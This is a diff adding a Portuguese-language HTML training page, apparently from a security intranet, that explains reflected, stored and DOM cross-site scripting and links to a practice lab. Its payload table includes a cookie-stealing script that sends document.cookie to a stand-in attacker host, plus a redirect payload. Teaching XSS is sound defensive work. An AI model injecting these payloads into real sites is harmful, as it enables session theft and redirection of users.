@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Detalhado | Security Intranet</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Estilos customizados -->
+    <style>
+        body {
+            background-color: #f0f0f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .xss-header {
+            background: linear-gradient(135deg, #ffc107 0%, #ff5722 100%);
+            color: white;
+            padding: 2rem 0;
+            margin-bottom: 2rem;
+            border-bottom: 4px solid #dc3545;
+        }
+        .payload-card {
+            border-left: 4px solid #17a2b8;
+            transition: all 0.3s;
+        }
+        .payload-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        .danger-zone {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        pre {
+            background-color: #1e1e1e;
+            color: #d4d4d4;
+            padding: 1rem;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- Cabeçalho -->
+    <div class="xss-header">
+        <div class="container">
+            <h1><i class="fas fa-biohazard"></i> Cross-Site Scripting (XSS)</h1>
+            <p class="lead">Tudo sobre ataques de injeção de scripts maliciosos</p>
+        </div>
+    </div>
+
+    <!-- Conteúdo Principal -->
+    <div class="container">
+        <!-- Botão de Voltar -->
+        <a href="/" class="btn btn-outline-dark mb-4">
+            <i class="fas fa-arrow-left"></i> Voltar ao Dashboard
+        </a>
+
+        <!-- Card de Explicação -->
+        <div class="card mb-4">
+            <div class="card-body">
+                <h2>O que é XSS?</h2>
+                <p>XSS (Cross-Site Scripting) é uma vulnerabilidade que permite a injeção de scripts maliciosos em páginas web vistas por outros usuários.</p>
+                
+                <div class="danger-zone">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Impacto:</h4>
+                    <ul>
+                        <li>Roubo de cookies e sessões</li>
+                        <li>Redirecionamento para sites maliciosos</li>
+                        <li>Keylogging (captura de teclas digitadas)</li>
+                        <li>Defacement (modificação de páginas)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tipos de XSS -->
+        <div class="row">
+            <div class="col-md-4 mb-4">
+                <div class="payload-card card h-100">
+                    <div class="card-header bg-primary text-white">
+                        <h3>Reflected XSS</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>O script malicioso é refletido na resposta HTTP, geralmente através de parâmetros da URL.</p>
+                        <pre>http://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-4 mb-4">
+                <div class="payload-card card h-100">
+                    <div class="card-header bg-success text-white">
+                        <h3>Stored XSS</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>O script é armazenado no servidor e executado para todos os usuários que acessam a página.</p>
+                        <pre>&lt;script&gt;stealCookies()&lt;/script&gt;</pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-4 mb-4">
+                <div class="payload-card card h-100">
+                    <div class="card-header bg-info text-white">
+                        <h3>DOM XSS</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>A vulnerabilidade existe no código JavaScript do cliente, sem envolver o servidor.</p>
+                        <pre>document.write(untrustedData);</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Exemplos de Payloads -->
+        <div class="card mb-4">
+            <div class="card-header bg-dark text-white">
+                <h3><i class="fas fa-code"></i> Payloads Comuns</h3>
+            </div>
+            <div class="card-body">
+                <table class="table table-striped">
+                    <thead>
+                        <tr>
+                            <th>Tipo</th>
+                            <th>Payload</th>
+                            <th>Efeito</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Alerta Simples</td>
+                            <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                            <td>Exibe um popup</td>
+                        </tr>
+                        <tr>
+                            <td>Roubo de Cookies</td>
+                            <td><code>&lt;script&gt;fetch('http://atacker.com?cookie='+document.cookie)&lt;/script&gt;</code></td>
+                            <td>Envia cookies para atacante</td>
+                        </tr>
+                        <tr>
+                            <td>Redirecionamento</td>
+                            <td><code>&lt;script&gt;location.href='http://malicious.com'&lt;/script&gt;</code></td>
+                            <td>Redireciona usuário</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Laboratório Prático -->
+        <div class="card mb-5">
+            <div class="card-header bg-danger text-white">
+                <h3><i class="fas fa-flask"></i> Laboratório Prático</h3>
+            </div>
+            <div class="card-body text-center">
+                <p>Teste esses conceitos no nosso laboratório interativo:</p>
+                <a href="/xss/" class="btn btn-lg btn-warning">
+                    <i class="fas fa-biohazard"></i> Acessar XSS Lab
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rodapé -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container text-center">
+            <p>© 2023 Security Intranet - <i class="fas fa-shield-alt"></i></p>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+</body>
+</html>
